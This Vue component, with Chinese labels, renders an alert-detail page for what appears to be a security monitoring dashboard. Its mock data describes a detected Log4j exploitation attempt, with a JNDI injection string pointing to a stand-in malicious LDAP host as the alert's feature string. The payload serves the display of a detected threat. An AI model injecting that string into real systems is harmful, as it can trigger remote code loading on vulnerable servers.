<template>
  <div class="app-container">
    <el-card class="alert-detail">
      <!-- 基本信息 -->
      <div class="detail-header">
        <div class="alert-title">
          <el-tag :type="alertData.level === 'high' ? 'danger' : 'warning'" effect="dark">
            {{ alertData.level === 'high' ? '高危' : '中危' }}
          </el-tag>
          <span class="alert-id">#{{ alertData.id }}</span>
        </div>
        <div class="alert-time">发现时间：{{ alertData.time }}</div>
      </div>

      <!-- 告警信息 -->
      <el-descriptions class="alert-info" title="告警信息" :column="2" border>
        <el-descriptions-item label="告警类型">{{ alertData.type }}</el-descriptions-item>
        <el-descriptions-item label="威胁等级">{{ alertData.level }}</el-descriptions-item>
        <el-descriptions-item label="源IP">{{ alertData.sourceIp }}</el-descriptions-item>
        <el-descriptions-item label="目标IP">{{ alertData.targetIp }}</el-descriptions-item>
        <el-descriptions-item label="处理状态">
          <el-tag :type="alertData.status === 'pending' ? 'warning' : 'success'">
            {{ alertData.status === 'pending' ? '待处理' : '已处理' }}
          </el-tag>
        </el-descriptions-item>
        <el-descriptions-item label="处理人">{{ alertData.handler || '-' }}</el-descriptions-item>
      </el-descriptions>

      <!-- 特征详情 -->
      <div class="feature-section">
        <div class="section-title">特征详情</div>
        <el-collapse v-model="activeNames">
          <el-collapse-item title="数据包信息" name="1">
            <div class="packet-info">
              <pre class="code-block">{{ alertData.packetInfo }}</pre>
            </div>
          </el-collapse-item>
          <el-collapse-item title="请求头信息" name="2">
            <div class="header-info">
              <pre class="code-block">{{ alertData.headerInfo }}</pre>
            </div>
          </el-collapse-item>
          <el-collapse-item title="特征串" name="3">
            <div class="feature-info">
              <pre class="code-block">{{ alertData.featureString }}</pre>
            </div>
          </el-collapse-item>
        </el-collapse>
      </div>

      <!-- 处理操作 -->
      <div class="action-section">
        <el-button type="primary" @click="handleAlert">处理告警</el-button>
        <el-button type="info" @click="exportDetail">导出详情</el-button>
      </div>
    </el-card>

    <!-- 处理告警对话框 -->
    <el-dialog title="处理告警" :visible.sync="dialogVisible" width="500px">
      <el-form :model="handleForm" label-width="80px">
        <el-form-item label="处理方式">
          <el-select v-model="handleForm.method" placeholder="请选择处理方式">
            <el-option label="封禁IP" value="block"></el-option>
            <el-option label="忽略" value="ignore"></el-option>
            <el-option label="加入白名单" value="whitelist"></el-option>
          </el-select>
        </el-form-item>
        <el-form-item label="处理备注">
          <el-input type="textarea" v-model="handleForm.comment"></el-input>
        </el-form-item>
      </el-form>
      <div slot="footer" class="dialog-footer">
        <el-button @click="dialogVisible = false">取 消</el-button>
        <el-button type="primary" @click="submitHandle">确 定</el-button>
      </div>
    </el-dialog>
  </div>
</template>

<script>
export default {
  name: 'AlertDetail',
  data() {
    return {
      alertData: {
        id: '20240315001',
        type: 'Log4j漏洞利用',
        level: 'high',
        sourceIp: '192.168.1.100',
        targetIp: '192.168.1.200',
        status: 'pending',
        time: '2024-03-15 10:30:45',
        handler: '',
        packetInfo: `GET /api/test HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: */*`,
        headerInfo: `Connection: keep-alive
Content-Type: application/json
Content-Length: 256`,
        featureString: '${jndi:ldap://malicious.example.com:1389/Exploit}'
      },
      activeNames: ['1'],
      dialogVisible: false,
      handleForm: {
        method: '',
        comment: ''
      }
    }
  },
  methods: {
    handleAlert() {
      this.dialogVisible = true
    },
    exportDetail() {
      // 实现导出功能
      this.$message.success('导出成功')
    },
    submitHandle() {
      // 实现处理提交
      this.$message.success('处理成功')
      this.dialogVisible = false
      this.alertData.status = 'handled'
      this.alertData.handler = '管理员'
    }
  }
}
</script>

<style lang="scss" scoped>
.alert-detail {
  background: #0d1b2a;
  color: #fff;

  :deep(.el-card__body) {
    padding: 20px;
  }

  .detail-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 20px;

    .alert-title {
      display: flex;
      align-items: center;
      gap: 10px;

      .alert-id {
        font-size: 18px;
        font-weight: bold;
      }
    }

    .alert-time {
      color: rgba(255, 255, 255, 0.7);
    }
  }

  .alert-info {
    margin-bottom: 20px;

    :deep(.el-descriptions__label) {
      color: rgba(255, 255, 255, 0.7);
    }

    :deep(.el-descriptions__content) {
      color: #fff;
    }
  }

  .feature-section {
    margin-bottom: 20px;

    .section-title {
      font-size: 16px;
      font-weight: bold;
      margin-bottom: 15px;
    }

    .code-block {
      background: rgba(0, 0, 0, 0.3);
      padding: 15px;
      border-radius: 4px;
      font-family: monospace;
      white-space: pre-wrap;
      word-break: break-all;
    }
  }

  .action-section {
    display: flex;
    justify-content: center;
    gap: 20px;
    margin-top: 30px;
  }
}

:deep(.el-collapse) {
  border: none;
  background: transparent;

  .el-collapse-item__header {
    background: transparent;
    color: #fff;
    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
  }

  .el-collapse-item__content {
    background: transparent;
    color: #fff;
  }
}

:deep(.el-dialog) {
  background: #0d1b2a;

  .el-dialog__title {
    color: #fff;
  }

  .el-dialog__body {
    color: #fff;
  }

  .el-form-item__label {
    color: rgba(255, 255, 255, 0.7);
  }
}
</style> 